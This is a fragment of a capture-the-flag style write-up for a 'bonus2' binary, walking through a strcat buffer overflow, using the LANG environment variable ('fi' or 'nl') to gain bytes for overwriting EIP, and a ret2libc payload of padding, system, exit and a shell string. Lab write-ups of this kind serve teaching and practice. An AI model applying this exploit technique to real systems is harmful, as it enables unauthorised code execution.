...
$ ./bonus2 test world
Hello test 
$ ./bonus2 test1 test2 test3
```
The program print the first parameter
...
```
---
We have so much interesting functions that could be abused like `strncpy` or `strcat`.
Program want 2 parameters for run.

Let's try to provoke a segfault : 
```
gdb-peda$ r `python -c 'print("A"*100)'` `python -c 'print("B" * 100)'`
Stopped reason: SIGSEGV
0x08004242 in ?? ()
gdb-peda$
```

We have a segfault but only 2 'b' character overwrite EIP

After investigation, we understand that bufferoverflow take place with `strcat` who use local variable and our input. We can change the len of local variable thanx the value of `LANG` environment variable.

If `LANG == fi or nl` we earn enought bytes for overwrite fully the eip.


Finding all need address : 
```
gdb-peda$ p system
...
We can now write our exploit for a RET2LIBC : 
...
print PAD + SYSTEM + EXIT + SH
```

Let's go
```
$ ./exploit.py > payload
$ LANG=fi $PWD/bonus2 `cat payload `
